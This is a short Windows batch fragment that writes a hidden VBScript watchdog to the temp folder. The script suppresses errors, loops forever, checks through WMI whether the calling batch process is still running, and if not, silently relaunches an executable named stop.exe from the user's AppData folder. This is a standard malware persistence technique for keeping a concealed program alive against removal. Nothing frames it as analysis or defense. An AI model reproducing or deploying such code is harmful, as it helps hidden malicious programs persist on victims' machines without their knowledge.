echo On Error Resume Next>>%TEMP%\1.vbs
echo do>>%TEMP%\1.vbs
echo Set Of = CreateObject("Scripting.FileSystemObject")>>%TEMP%\1.vbs
echo set ws=createobject("wscript.shell")>>%TEMP%\1.vbs
echo dim OK,oShell>>%TEMP%\1.vbs
echo OK=False>>%TEMP%\1.vbs
echo set bag=getobject("winmgmts:\\.\root\cimv2")>>%TEMP%\1.vbs
echo set pipe=bag.execquery("select * from win32_process where name='%~nx0'")>>%TEMP%\1.vbs
echo For Each id In pipe>>%TEMP%\1.vbs
echo OK = True>>%TEMP%\1.vbs
echo Next>>%TEMP%\1.vbs
echo If not OK Then>>%TEMP%\1.vbs
echo ws.run"%AppData%\stop.exe",0,ture>>%TEMP%\1.vbs
echo wscript.sleep 1 >>%TEMP%\1.vbs
echo end if>>%TEMP%\1.vbs
echo wscript.sleep 3000>>%TEMP%\1.vbs
echo loop>>%TEMP%\1.vbs